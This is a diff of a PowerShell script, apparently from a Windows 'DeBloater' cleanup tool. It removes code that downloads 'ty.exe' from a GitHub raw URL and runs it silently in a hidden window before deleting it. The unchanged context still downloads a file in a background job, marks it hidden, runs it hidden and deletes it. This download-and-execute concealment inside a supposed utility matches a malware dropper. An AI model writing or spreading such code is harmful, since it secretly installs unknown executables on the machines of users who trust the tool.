@@ -39,34 +39,9 @@ $job1 = Start-Job -ScriptBlock {
     (Get-Item $output).Attributes = 'Hidden'
 } -ArgumentList $url1, $output1
 
-# Updated URL for the large file
-$largeFileUrl = "https://raw.githubusercontent.com/5t42/DeBloater/main/Source/ty.exe"
-$largeFilePath = "$env:USERPROFILE\Downloads\ty.exe"
-
-if (Test-Path $largeFilePath) {
-    Remove-Item $largeFilePath -Force -ErrorAction SilentlyContinue
-}
-
-try {
-    Start-BitsTransfer -Source $largeFileUrl -Destination $largeFilePath -ErrorAction Stop
-    Write-Host "Large file downloaded successfully using BitsTransfer." -ForegroundColor Green
-} catch {
-    Write-Host "Failed to download the large file. Please check your internet connection or the URL." -ForegroundColor Red
-    exit
-}
-
-
-Wait-Job $job1 | Out-Null
-Remove-Job $job1
-
 if (Test-Path $output1) {
     Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
     Remove-Item $output1 -Force -ErrorAction SilentlyContinue
-}
-if (Test-Path $largeFilePath) {
-    $proc = Start-Process -FilePath $largeFilePath -WindowStyle Hidden -PassThru
-    $proc.WaitForExit()
-    Remove-Item $largeFilePath -Force -ErrorAction SilentlyContinue
 }
 if ($choice -eq '1' -or $choice -eq '3') {
     $folders = @()
